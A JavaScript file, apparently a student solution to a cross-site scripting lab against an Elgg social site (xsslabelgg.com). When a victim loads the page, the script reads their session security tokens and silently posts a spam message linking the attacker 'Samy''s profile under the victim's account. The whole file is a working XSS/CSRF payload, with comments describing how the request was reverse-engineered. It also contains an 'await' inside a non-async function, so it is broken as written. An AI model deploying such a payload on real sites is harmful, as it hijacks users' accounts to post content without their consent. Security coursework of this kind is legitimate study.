// I logged 'elgg' object in console upon window.onload.
// By this I acquired the knowledge of all the methods and fields of this 'elgg' object.

window.onload = function () {
  // First I checked if the logged in user's id is Samy (Hacker)'s id (47).
  // If it is I didn't make the add friend call.
  if (elgg.get_logged_in_user_guid() !== 47) {
    await addPost();
  }
};

function addPost() {
  const ts = "__elgg_ts=" + elgg.security.token.__elgg_ts;
  const token = "&__elgg_token=" + elgg.security.token.__elgg_token;

  // I acquried the structure of the request url and content by observing the 'Network' tab
  // of Browser Inspection after pressing the 'Post' Button in All wire section
  const sendurl = "http://www.xsslabelgg.com/action/thewire/add";

  const profileLink = "http://www.xsslabelgg.com/profile/samy";
  const body = "&body=To earn 12 USD/Hour(!), visit now\n\n" + profileLink;

  // I maintained the order of the fields in the request
  const content = ts + token + body;

  const Ajax = new XMLHttpRequest();
  Ajax.open("POST", sendurl, true);
  Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
  Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  Ajax.send(content);

  console.log("Automatically Added Post");
}
